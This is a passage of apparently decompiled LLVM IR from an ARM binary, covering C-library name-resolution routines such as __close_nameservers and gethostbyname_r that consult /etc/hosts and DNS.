  uselistorder i32 -37176, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37176), { 1, 0 }
  uselistorder i32 13196, { 0, 2, 1, 3 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_135c0, { 7, 6, 3, 4, 5, 0, 1, 2 }
  uselistorder label %dec_label_pc_13530, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_134e4, { 1, 0 }
  uselistorder label %dec_label_pc_134dc, { 1, 0 }
  uselistorder label %dec_label_pc_133a0, { 1, 0 }
  uselistorder label %dec_label_pc_134c0.backedge, { 4, 10, 8, 7, 9, 0, 1, 2, 3, 6, 5 }
  uselistorder label %dec_label_pc_1321c, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @__close_nameservers() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13628 = load i32, i32* @r4, align 4
  store i32 %v3_13628, i32* %stack_var_-20, align 4
  store i32 13204, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  store i32 -37100, i32* %r3.global-to-local, align 4
  %v4_1363c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 13204) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37100), i32* %r3.global-to-local, align 4
  store i32 79440, i32* @lr, align 4
  %v1_1364c = icmp ne i32 %v4_1363c, add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 -37100)
  call void @__pseudo_cond_branch(i1 %v1_1364c, i32 ptrtoint (i32* @global_var_c038.332 to i32))
  store i32 13208, i32* %r3.global-to-local, align 4
  store i32 13212, i32* @r7, align 4
  store i32 13200, i32* @r6, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_13660 = load i32, i32* @r5, align 4
  %v3_13660 = add i32 %v1_13660, 13208
  %v4_13660 = inttoptr i32 %v3_13660 to i32*
  store i32 0, i32* %v4_13660, align 4
  %v0_13664 = load i32, i32* %r2.global-to-local, align 4
  %v1_13664 = load i32, i32* @r5, align 4
  %v2_13664 = load i32, i32* %r4.global-to-local, align 4
  %v3_13664 = add i32 %v2_13664, %v1_13664
  %v4_13664 = inttoptr i32 %v3_13664 to i32*
  store i32 %v0_13664, i32* %v4_13664, align 4
  br label %dec_label_pc_1367c

dec_label_pc_1366c:                               ; preds = %dec_label_pc_1367c
  store i32 %v4_13690, i32* %r3.global-to-local, align 4
  store i32 %v1_13684, i32* %v3_1367c, align 4
  %v0_13674 = load i32, i32* %r3.global-to-local, align 4
  %v1_13674 = load i32, i32* %r2.global-to-local, align 4
  %v4_13674 = mul i32 %v1_13674, 4
  %v5_13674 = add i32 %v4_13674, %v0_13674
  %v6_13674 = inttoptr i32 %v5_13674 to i32*
  %v7_13674 = load i32, i32* %v6_13674, align 4
  store i32 %v7_13674, i32* @r0, align 4
  %v0_13678 = call i32 @free()
  br label %dec_label_pc_1367c

dec_label_pc_1367c:                               ; preds = %entry, %dec_label_pc_1366c
  %v0_1367c = load i32, i32* @r5, align 4
  %v1_1367c = load i32, i32* @r7, align 4
  %v2_1367c = add i32 %v1_1367c, %v0_1367c
  %v3_1367c = inttoptr i32 %v2_1367c to i32*
  %v4_1367c = load i32, i32* %v3_1367c, align 4
  store i32 %v4_1367c, i32* @r4, align 4
  %v2_13680 = icmp eq i32 %v4_1367c, 0
  %v1_13684 = add i32 %v4_1367c, -1
  store i32 %v1_13684, i32* %r2.global-to-local, align 4
  %v0_13688 = load i32, i32* @r6, align 4
  store i32 %v0_13688, i32* %r3.global-to-local, align 4
  %v2_13690 = add i32 %v0_13688, %v0_1367c
  %v3_13690 = inttoptr i32 %v2_13690 to i32*
  %v4_13690 = load i32, i32* %v3_13690, align 4
  br i1 %v2_13680, label %dec_label_pc_13690, label %dec_label_pc_1366c

dec_label_pc_13690:                               ; preds = %dec_label_pc_1367c
  store i32 %v4_13690, i32* @r0, align 4
  %v0_13694 = call i32 @free()
  %v0_13698 = load i32, i32* @r4, align 4
  %v1_13698 = load i32, i32* @r5, align 4
  %v2_13698 = load i32, i32* @r6, align 4
  %v3_13698 = add i32 %v2_13698, %v1_13698
  %v4_13698 = inttoptr i32 %v3_13698 to i32*
  store i32 %v0_13698, i32* %v4_13698, align 4
  %v2_136a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_136a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_13694

; uselistorder directives
  uselistorder i32 %v4_13690, { 1, 0 }
  uselistorder i32 %v1_13684, { 1, 0 }
  uselistorder i32* %v3_1367c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 13200, { 3, 1, 6, 4, 5, 0, 2 }
  uselistorder i32 13212, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 13208, { 0, 1, 3, 7, 4, 8, 2, 6, 5, 9, 10, 12, 11, 13 }
  uselistorder i32 -37100, { 1, 2, 0, 3 }
  uselistorder i32 13204, { 4, 5, 1, 0, 7, 2, 6, 3, 8 }
  uselistorder label %dec_label_pc_1367c, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1) local_unnamed_addr {
entry:
  %v0_136c0 = load i32, i32* @lr, align 4
  %v0_136cc = load i32, i32* @r1, align 4
  store i32 %v0_136cc, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %v0_136cc, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_136fc = call i32 @__read_etc_hosts_r()
  store i32 %v0_136c0, i32* @lr, align 4
  ret i32 %v0_136fc
}

define i32 @gethostbyname_r() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp28, i32* %stack_var_0, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_13714 = load i32, i32* @r1, align 4
  store i32 %v0_13714, i32* @r7, align 4
  store i32 %tmp28, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_13720 = load i32, i32* @r0, align 4
  store i32 %v0_13720, i32* @fp, align 4
  %v2_13720 = icmp eq i32 %v0_13720, 0
  %v2_13724 = inttoptr i32 %tmp28 to i32*
  store i32 0, i32* %v2_13724, align 4
  %v0_13728 = load i32, i32* @r2, align 4
  %v0_1372c = load i32, i32* @r3, align 4
  store i32 %v0_1372c, i32* @r6, align 4
  br i1 %v2_13720, label %bb, label %dec_label_pc_13738

bb:                                               ; preds = %entry
  %v1_13730 = load i32, i32* @r5, align 4
  %v2_13730 = add i32 %v1_13730, 22
  store i32 %v2_13730, i32* @r5, align 4
  br label %dec_label_pc_13a28

dec_label_pc_13738:                               ; preds = %entry
  store i32 60320, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_eb9c.512 to i32), i32* %r2.global-to-local, align 4
  %v0_13740 = call i32 @__aeabi_read_tp()
  store i32 %v0_13740, i32* %r0.global-to-local, align 4
  %v3_13748 = load i16, i16* @global_var_222f0.75, align 2
  %v4_13748 = sext i16 %v3_13748 to i32
  store i32 %v4_13748, i32* %r3.global-to-local, align 4
  store i32 %v4_13748, i32* %r2.global-to-local, align 4
  %v2_13750 = add i32 %v4_13748, %v0_13740
  %v3_13750 = inttoptr i32 %v2_13750 to i32*
  %v4_13750 = load i32, i32* %v3_13750, align 4
  store i32 %v4_13750, i32* @r8, align 4
  %v0_13754 = load i32, i32* @r5, align 4
  store i32 %v0_13754, i32* %v3_13750, align 4
  store i32 %v0_13740, i32* @r4, align 4
  store i32 2, i32* @r1, align 4
  %v0_13768 = load i32, i32* @fp, align 4
  store i32 %v0_13768, i32* %r0.global-to-local, align 4
  %v0_1376c = load i32, i32* @r7, align 4
  store i32 %v0_1376c, i32* %r2.global-to-local, align 4
  store i32 %v0_13728, i32* %r3.global-to-local, align 4
  %v1_1377c = call i32 @__get_hosts_byname_r(i32 %v0_13768)
  store i32 %v1_1377c, i32* %r0.global-to-local, align 4
  store i32 %v1_1377c, i32* @r5, align 4
  %v2_13780 = icmp eq i32 %v1_1377c, 0
  br i1 %v2_13780, label %.thread4, label %dec_label_pc_13794

.thread4:                                         ; preds = %dec_label_pc_13738
  store i32 60256, i32* %r3.global-to-local, align 4
  %v4_13788 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_13790.514 to i32), i32 60256) to i32*), align 4
  store i32 %v4_13788, i32* %r3.global-to-local, align 4
  %v1_1378c = load i32, i32* @r8, align 4
  %v2_1378c = load i32, i32* @r4, align 4
  %v4_1378c = add i32 %v2_1378c, %v4_13788
  %v5_1378c = inttoptr i32 %v4_1378c to i32*
  store i32 %v1_1378c, i32* %v5_1378c, align 4
  br label %dec_label_pc_13a28

dec_label_pc_13794:                               ; preds = %dec_label_pc_13738
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  %v1_13798 = inttoptr i32 %tmp17 to i32*
  %v2_13798 = load i32, i32* %v1_13798, align 4
  store i32 %v2_13798, i32* %r3.global-to-local, align 4
  %v7_1379c = icmp eq i32 %v2_13798, 1
  br i1 %v7_1379c, label %dec_label_pc_137b8, label %dec_label_pc_137a4

dec_label_pc_137a4:                               ; preds = %dec_label_pc_13794
  %v7_137a4 = icmp eq i32 %v2_13798, 4
  br i1 %v7_137a4, label %dec_label_pc_137e0, label %dec_label_pc_137ac

dec_label_pc_137ac:                               ; preds = %dec_label_pc_137a4
  %v3_137ac = icmp eq i32 %v2_13798, -1
  br i1 %v3_137ac, label %dec_label_pc_137cc, label %dec_label_pc_13a28

dec_label_pc_137b8:                               ; preds = %dec_label_pc_13794
  %v7_137b8 = icmp eq i32 %v1_1377c, 2
  br i1 %v7_137b8, label %.thread6, label %bb33

bb33:                                             ; preds = %dec_label_pc_137b8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_137e8

.thread6:                                         ; preds = %dec_label_pc_137b8
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_137e8

dec_label_pc_137cc:                               ; preds = %dec_label_pc_137ac
  %v3_137d0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_137d0 = sext i16 %v3_137d0 to i32
  store i32 %v4_137d0, i32* %r3.global-to-local, align 4
  %v0_137d4 = load i32, i32* @r4, align 4
  %v2_137d4 = add i32 %v0_137d4, %v4_137d0
  %v3_137d4 = inttoptr i32 %v2_137d4 to i32*
  %v4_137d4 = load i32, i32* %v3_137d4, align 4
  store i32 %v4_137d4, i32* %r3.global-to-local, align 4
  %v7_137d8 = icmp eq i32 %v4_137d4, 2
  br i1 %v7_137d8, label %dec_label_pc_137e0, label %dec_label_pc_13a28

dec_label_pc_137e0:                               ; preds = %dec_label_pc_137cc, %dec_label_pc_137a4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %.thread6, %bb33, %dec_label_pc_137e0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_137e0 ], [ 0, %bb33 ], [ 1, %.thread6 ]
  store i32 60152, i32* %r3.global-to-local, align 4
  %v0_137ec = call i32 @__aeabi_read_tp()
  %v3_137f0 = load i16, i16* @global_var_222f0.75, align 2
  %v4_137f0 = sext i16 %v3_137f0 to i32
  store i32 %tmp17, i32* @ip, align 4
  %v0_137f8 = load i32, i32* @r8, align 4
  %v3_137f8 = add i32 %v4_137f0, %v0_137ec
  %v4_137f8 = inttoptr i32 %v3_137f8 to i32*
  store i32 %v0_137f8, i32* %v4_137f8, align 4
  store i32 -1, i32* @r3, align 4
  %v1_13804 = load i32, i32* @ip, align 4
  %v2_13804 = inttoptr i32 %v1_13804 to i32*
  store i32 -1, i32* %v2_13804, align 4
  %v0_13808 = load i32, i32* @fp, align 4
  %v1_13808 = inttoptr i32 %v0_13808 to i8*
  store i32 %v0_13808, i32* %r0.global-to-local, align 4
  %v3_1380c = call i32 @strlen(i8* %v1_13808)
  store i32 %v3_1380c, i32* %r0.global-to-local, align 4
  %v1_13810 = add i32 %v3_1380c, 1
  store i32 %v1_13810, i32* @r4, align 4
  %v0_13814 = load i32, i32* @r6, align 4
  %v7_13818 = icmp sgt i32 %v0_13814, %v1_13810
  br i1 %v7_13818, label %dec_label_pc_1381c, label %dec_label_pc_13a24

dec_label_pc_1381c:                               ; preds = %dec_label_pc_137e8
  %v0_1381c = load i32, i32* @fp, align 4
  store i32 %v0_1381c, i32* @r1, align 4
  store i32 %v1_13810, i32* @r2, align 4
  store i32 %v0_13728, i32* @r0, align 4
  %v0_13828 = call i32 @memcpy()
  store i32 %v0_13828, i32* %r0.global-to-local, align 4
  %v1_13830 = load i32, i32* @r4, align 4
  %v2_13830 = add i32 %v1_13830, %v0_13728
  store i32 %v2_13830, i32* %r1.global-to-local, align 4
  %v1_13834 = sub i32 0, %v2_13830
  %v1_13838 = load i32, i32* @r6, align 4
  %v2_13838 = sub i32 %v1_13838, %v1_13830
  store i32 %v2_13838, i32* %r2.global-to-local, align 4
  %v1_1383c = urem i32 %v1_13834, 4
  store i32 %v1_1383c, i32* %r3.global-to-local, align 4
  %v2_13840 = sub i32 %v2_13838, %v1_1383c
  store i32 %v2_13840, i32* @sl, align 4
  %v1_13844 = add i32 %v2_13840, -8
  store i32 %v1_13844, i32* @r5, align 4
  %v7_1384c = icmp slt i32 %v1_13844, 256
  br i1 %v7_1384c, label %dec_label_pc_13a24, label %dec_label_pc_13850

dec_label_pc_13850:                               ; preds = %dec_label_pc_1381c
  %v2_13850 = add i32 %v1_1383c, %v2_13830
  store i32 %v2_13850, i32* @sb, align 4
  store i32 %v0_13728, i32* @ip, align 4
  %v1_13858 = add i32 %v2_13850, 8
  store i32 %v1_13858, i32* @r6, align 4
  store i32 0, i32* @r4, align 4
  %v1_13860 = add i32 %v2_13850, 16
  store i32 %v1_13860, i32* @r8, align 4
  %v4_13864 = inttoptr i32 %v2_13850 to i32*
  store i32 %v0_13728, i32* %v4_13864, align 4
  %v0_13868 = load i32, i32* @fp, align 4
  store i32 %v0_13868, i32* %r0.global-to-local, align 4
  %v0_1386c = load i32, i32* @r4, align 4
  %v1_1386c = load i32, i32* @sb, align 4
  %v2_1386c = add i32 %v1_1386c, 4
  %v3_1386c = inttoptr i32 %v2_1386c to i32*
  store i32 %v0_1386c, i32* %v3_1386c, align 4
  %v0_13870 = load i32, i32* @r8, align 4
  store i32 %v0_13870, i32* %r1.global-to-local, align 4
  %v2_13874 = inttoptr i32 %v0_13868 to i8*
  %v3_13874 = call i32 @inet_aton(i8* %v2_13874, i32 %v0_13870)
  store i32 %v3_13874, i32* %r0.global-to-local, align 4
  %v1_13878 = load i32, i32* @r4, align 4
  %v9_13878 = icmp eq i32 %v3_13874, %v1_13878
  br i1 %v9_13878, label %dec_label_pc_138bc, label %dec_label_pc_13880

dec_label_pc_13880:                               ; preds = %dec_label_pc_13850
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_13884 = load i32, i32* @r7, align 4
  %v2_13884 = add i32 %v1_13884, 8
  %v3_13884 = inttoptr i32 %v2_13884 to i32*
  store i32 2, i32* %v3_13884, align 4
  %v0_13888 = load i32, i32* %r3.global-to-local, align 4
  %v2_13888 = mul i32 %v0_13888, 2
  %v1_1388c = load i32, i32* @r7, align 4
  %v2_1388c = add i32 %v1_1388c, 12
  %v3_1388c = inttoptr i32 %v2_1388c to i32*
  store i32 %v2_13888, i32* %v3_1388c, align 4
  %v3_13890 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_13890, i32* %r1.global-to-local, align 4
  store i32 %v0_13728, i32* %r2.global-to-local, align 4
  store i32 %tmp17, i32* %r3.global-to-local, align 4
  %v0_1389c = load i32, i32* @r4, align 4
  store i32 %v0_1389c, i32* @r5, align 4
  %v0_138a0 = load i32, i32* @r8, align 4
  %v1_138a0 = load i32, i32* @sb, align 4
  %v2_138a0 = add i32 %v1_138a0, 8
  %v3_138a0 = inttoptr i32 %v2_138a0 to i32*
  store i32 %v0_138a0, i32* %v3_138a0, align 4
  %v0_138a4 = load i32, i32* @r7, align 4
  %v1_138a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_138a4 = inttoptr i32 %v1_138a4 to i32*
  store i32 %v0_138a4, i32* %v2_138a4, align 4
  %v0_138a8 = load i32, i32* @r7, align 4
  %v1_138a8 = inttoptr i32 %v0_138a8 to i32*
  %v2_138a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_138a8, i32* %v1_138a8, align 4
  %v3_138a8 = add i32 %v0_138a8, 4
  %v4_138a8 = inttoptr i32 %v3_138a8 to i32*
  %v5_138a8 = load i32, i32* @sb, align 4
  store i32 %v5_138a8, i32* %v4_138a8, align 4
  %v0_138ac = load i32, i32* @r6, align 4
  %v1_138ac = load i32, i32* @r7, align 4
  %v2_138ac = add i32 %v1_138ac, 16
  %v3_138ac = inttoptr i32 %v2_138ac to i32*
  store i32 %v0_138ac, i32* %v3_138ac, align 4
  %v0_138b0 = load i32, i32* @r4, align 4
  %v1_138b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_138b0 = inttoptr i32 %v1_138b0 to i32*
  store i32 %v0_138b0, i32* %v2_138b0, align 4
  %v0_138b4 = load i32, i32* @r4, align 4
  %v1_138b4 = load i32, i32* @r6, align 4
  %v2_138b4 = add i32 %v1_138b4, 4
  %v3_138b4 = inttoptr i32 %v2_138b4 to i32*
  store i32 %v0_138b4, i32* %v3_138b4, align 4
  br label %dec_label_pc_13a28

dec_label_pc_138bc:                               ; preds = %dec_label_pc_13850
  store i32 %storemerge2, i32* @ip, align 4
  %v2_138c0 = icmp eq i32 %storemerge2, 0
  br i1 %v2_138c0, label %dec_label_pc_138c8, label %dec_label_pc_138f8

dec_label_pc_138c8:                               ; preds = %dec_label_pc_138bc
  %v0_138d4 = load i32, i32* @fp, align 4
  store i32 %v0_138d4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_138dc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_138dc, i32* %r2.global-to-local, align 4
  %v2_138e0 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_138e0, i32* %r3.global-to-local, align 4
  %v7_138ec = inttoptr i32 %v0_138d4 to i8*
  %v8_138ec = call i32 @__dns_lookup(i8* %v7_138ec, i32 1, i32 %v2_138dc, i32 %v2_138e0)
  store i32 %v8_138ec, i32* %r0.global-to-local, align 4
  %v1_138f0 = icmp slt i32 %v8_138ec, 0
  br i1 %v1_138f0, label %dec_label_pc_138f8, label %dec_label_pc_1390c

dec_label_pc_138f8:                               ; preds = %dec_label_pc_138c8, %dec_label_pc_138bc
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_13798, align 4
  br label %dec_label_pc_13a28

dec_label_pc_1390c:                               ; preds = %dec_label_pc_138c8
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v7_13910 = icmp eq i32 %tmp10, 1
  br i1 %v7_13910, label %dec_label_pc_13918, label %dec_label_pc_139f0

dec_label_pc_13918:                               ; preds = %dec_label_pc_1390c
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_13930 = load i32, i32* @r5, align 4
  %v2_13930 = add i32 %v0_13930, -12
  store i32 %v2_13930, i32* @r8, align 4
  %v8_13930 = icmp slt i32 %v2_13930, 0
  br i1 %v8_13930, label %bb35, label %dec_label_pc_1393c

bb35:                                             ; preds = %dec_label_pc_13918
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_13a10

dec_label_pc_1393c:                               ; preds = %dec_label_pc_13918
  %v0_1393c = load i32, i32* @r6, align 4
  store i32 %v0_1393c, i32* @r1, align 4
  %v2_13940 = add i32 %v0_1393c, 12
  store i32 %v2_13940, i32* @r0, align 4
  %v2_13944 = call i32 @memmove(i32 %v2_13940, i32 %v0_1393c)
  %v0_13948 = load i32, i32* @sb, align 4
  %v1_13948 = add i32 %v0_13948, 4
  store i32 %v1_13948, i32* @r3, align 4
  %v1_1394c = load i32, i32* @r4, align 4
  %v2_1394c = add i32 %v1_1394c, %v1_13948
  store i32 %v2_1394c, i32* @r5, align 4
  store i32 %v2_1394c, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1395c = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_13968.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %dec_label_pc_1393c, %dec_label_pc_13968
  %v0_13968 = phi i32 [ %v0_13968.pre, %dec_label_pc_1393c ], [ %v1_1396c, %dec_label_pc_13968 ]
  %v1_13968 = load i32, i32* @r6, align 4
  %v7_13968 = inttoptr i32 %v1_13968 to i32*
  store i32 %v0_13968, i32* %v7_13968, align 4
  %v0_1396c = load i32, i32* @r5, align 4
  %v1_1396c = add i32 %v0_1396c, 4
  store i32 %v1_1396c, i32* @r5, align 4
  %v0_13970 = load i32, i32* %r0.global-to-local, align 4
  %v1_13970 = add i32 %v0_13970, 1
  store i32 %v1_13970, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_13978 = icmp eq i32 %v1_13970, 0
  br i1 %v9_13978, label %dec_label_pc_13968, label %dec_label_pc_13980

dec_label_pc_13980:                               ; preds = %dec_label_pc_13968
  %v3_13980 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_13980, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_13988 = icmp eq i32 %v3_13980, 0
  %v1_1398c = load i32, i32* @r6, align 4
  %v5_1398c = mul i32 %v1_13970, 4
  %v6_1398c = add i32 %v1_1398c, %v5_1398c
  %v7_1398c = inttoptr i32 %v6_1398c to i32*
  store i32 0, i32* %v7_1398c, align 4
  br i1 %v2_13988, label %dec_label_pc_139bc, label %dec_label_pc_13994

dec_label_pc_13994:                               ; preds = %dec_label_pc_13980
  %v0_13994 = load i32, i32* @r4, align 4
  %v1_13994 = inttoptr i32 %v0_13994 to i8*
  store i32 %v0_13994, i32* %r0.global-to-local, align 4
  %v3_13998 = call i32 @strlen(i8* %v1_13994)
  store i32 %v3_13998, i32* %r0.global-to-local, align 4
  %v0_1399c = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1399c, %v3_13998
  br i1 %tmp, label %dec_label_pc_139a4, label %dec_label_pc_139bc

dec_label_pc_139a4:                               ; preds = %dec_label_pc_13994
  %v0_139a4 = load i32, i32* @r4, align 4
  store i32 %v0_139a4, i32* @r1, align 4
  %v0_139a8 = load i32, i32* @r5, align 4
  store i32 %v0_139a8, i32* %r0.global-to-local, align 4
  %v2_139ac = inttoptr i32 %v0_139a8 to i8*
  %v3_139ac = call i32 @strcpy(i8* %v2_139ac, i32 %v0_139a4)
  store i32 %v3_139ac, i32* %r0.global-to-local, align 4
  %v0_139b0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_139bc

dec_label_pc_139bc:                               ; preds = %dec_label_pc_13994, %dec_label_pc_13980, %dec_label_pc_139a4
  %storemerge1 = phi i32 [ %v0_139b0, %dec_label_pc_139a4 ], [ %v0_13728, %dec_label_pc_13994 ], [ %v0_13728, %dec_label_pc_13980 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  %v3_139bc = load i32, i32* %stack_var_0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_139c4 = load i32, i32* @r7, align 4
  %v2_139c4 = inttoptr i32 %v3_139bc to i32*
  store i32 %v0_139c4, i32* %v2_139c4, align 4
  store i32 %tmp17, i32* @ip, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_139d0 = load i32, i32* @r7, align 4
  %v2_139d0 = add i32 %v1_139d0, 8
  %v3_139d0 = inttoptr i32 %v2_139d0 to i32*
  store i32 2, i32* %v3_139d0, align 4
  %v0_139d4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_139d4, i32* @r5, align 4
  %v0_139d8 = load i32, i32* %r2.global-to-local, align 4
  %v2_139d8 = mul i32 %v0_139d8, 2
  store i32 %v2_139d8, i32* %r2.global-to-local, align 4
  %v1_139dc = load i32, i32* @r7, align 4
  %v2_139dc = add i32 %v1_139dc, 12
  %v3_139dc = inttoptr i32 %v2_139dc to i32*
  store i32 %v2_139d8, i32* %v3_139dc, align 4
  %v0_139e0 = load i32, i32* @r7, align 4
  %v1_139e0 = inttoptr i32 %v0_139e0 to i32*
  %v2_139e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_139e0, i32* %v1_139e0, align 4
  %v3_139e0 = add i32 %v0_139e0, 4
  %v4_139e0 = inttoptr i32 %v3_139e0 to i32*
  %v5_139e0 = load i32, i32* @sb, align 4
  store i32 %v5_139e0, i32* %v4_139e0, align 4
  %v0_139e4 = load i32, i32* @r6, align 4
  %v1_139e4 = load i32, i32* @r7, align 4
  %v2_139e4 = add i32 %v1_139e4, 16
  %v3_139e4 = inttoptr i32 %v2_139e4 to i32*
  store i32 %v0_139e4, i32* %v3_139e4, align 4
  %v0_139e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_139e8 = load i32, i32* @ip, align 4
  %v2_139e8 = inttoptr i32 %v1_139e8 to i32*
  store i32 %v0_139e8, i32* %v2_139e8, align 4
  br label %dec_label_pc_13a10

dec_label_pc_139f0:                               ; preds = %dec_label_pc_1390c
  store i32 %tmp17, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %v1_13798, align 4
  store i32 %v0_137ec, i32* @ip, align 4
  %v3_13a04 = load i32, i32* @global_var_222ac.107, align 4
  store i32 %v3_13a04, i32* %r3.global-to-local, align 4
  %v0_13a08 = load i32, i32* %r2.global-to-local, align 4
  %v3_13a08 = add i32 %v3_13a04, %v0_137ec
  %v4_13a08 = inttoptr i32 %v3_13a08 to i32*
  store i32 %v0_13a08, i32* %v4_13a08, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_13a10

dec_label_pc_13a10:                               ; preds = %bb35, %dec_label_pc_139bc, %dec_label_pc_139f0
  %v3_13a10 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_13a10, i32* @r0, align 4
  %v0_13a14 = call i32 @free()
  %v3_13a18 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_13a18, i32* @r0, align 4
  %v0_13a1c = call i32 @free()
  store i32 %v0_13a1c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13a28

dec_label_pc_13a24:                               ; preds = %dec_label_pc_137e8, %dec_label_pc_1381c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_13a28

dec_label_pc_13a28:                               ; preds = %bb, %.thread4, %dec_label_pc_137cc, %dec_label_pc_137ac, %dec_label_pc_13a10, %dec_label_pc_138f8, %dec_label_pc_13880, %dec_label_pc_13a24
  %v0_13a28 = load i32, i32* @r5, align 4
  store i32 %v0_13a28, i32* %r0.global-to-local, align 4
  ret i32 %v0_13a28

; uselistorder directives
  uselistorder i32 %v2_139d8, { 1, 0 }
  uselistorder i32 %v0_13994, { 1, 0 }
  uselistorder i32 %v1_13970, { 0, 2, 1 }
  uselistorder i32 %v1_1396c, { 1, 0 }
  uselistorder i32 %v0_1393c, { 1, 0, 2 }
  uselistorder i32 %v2_13930, { 1, 0 }
  uselistorder i32 %v1_1383c, { 2, 1, 0 }
  uselistorder i32 %v1_13830, { 1, 0 }
  uselistorder i32 %v0_13808, { 1, 0 }
  uselistorder i32 %v0_137ec, { 0, 2, 1 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_13798, { 1, 0, 2 }
  uselistorder i32 %v0_13740, { 1, 0, 2 }
  uselistorder i32 %v0_13728, { 1, 2, 3, 5, 4, 0, 6, 7 }
  uselistorder i32 %v0_13720, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32 %tmp17, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 5, 4, 7, 6, 8, 19, 20, 10, 9, 12, 11, 13, 15, 14, 17, 16, 18 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 17, 16, 15, 14, 3, 2, 1, 0, 13, 24, 29, 28, 27, 5, 26, 25, 6, 4 }
  uselistorder i32* @global_var_222ac.107, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_13a28, { 7, 4, 5, 6, 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_13a24, { 1, 0 }
  uselistorder label %dec_label_pc_13a10, { 2, 1, 0 }
